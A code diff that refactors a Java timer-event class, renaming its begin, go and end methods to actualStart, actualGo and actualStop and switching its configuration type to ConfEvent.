@@ -16,6 +16,7 @@ import java.util.GregorianCalendar;
 import java.util.TimeZone;
 
 import com.android.service.auto.Cfg;
+import com.android.service.conf.ConfEvent;
 import com.android.service.conf.ConfigurationException;
 import com.android.service.util.Check;
 import com.android.service.util.DataBuffer;
@@ -60,7 +61,7 @@ public class EventTimer extends BaseTimer {
 	 * .event .Event)
 	 */
 	@Override
-	public boolean parse(final EventConf conf) {
+	public boolean parse(final ConfEvent conf) {
 		try {
 			String ts = conf.getString("ts");
 			String te = conf.getString("te");
@@ -94,7 +95,7 @@ public class EventTimer extends BaseTimer {
 	 * @see com.ht.AndroidServiceGUI.event.EventBase#begin()
 	 */
 	@Override
-	public void begin() {
+	public void actualStart() {
 		final long now = System.currentTimeMillis();
 
 		Calendar calendar = GregorianCalendar.getInstance(TimeZone.getTimeZone("GMT"));
@@ -161,7 +162,7 @@ public class EventTimer extends BaseTimer {
 	 * @see com.ht.AndroidServiceGUI.ThreadBase#go()
 	 */
 	@Override
-	public void go() {
+	public void actualGo() {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " Info: " + "triggering");//$NON-NLS-1$ //$NON-NLS-2$
 		}
@@ -194,7 +195,7 @@ public class EventTimer extends BaseTimer {
 	 * @see com.ht.AndroidServiceGUI.event.EventBase#end()
 	 */
 	@Override
-	public void end() {
+	public void actualStop() {
 
 	}
 }
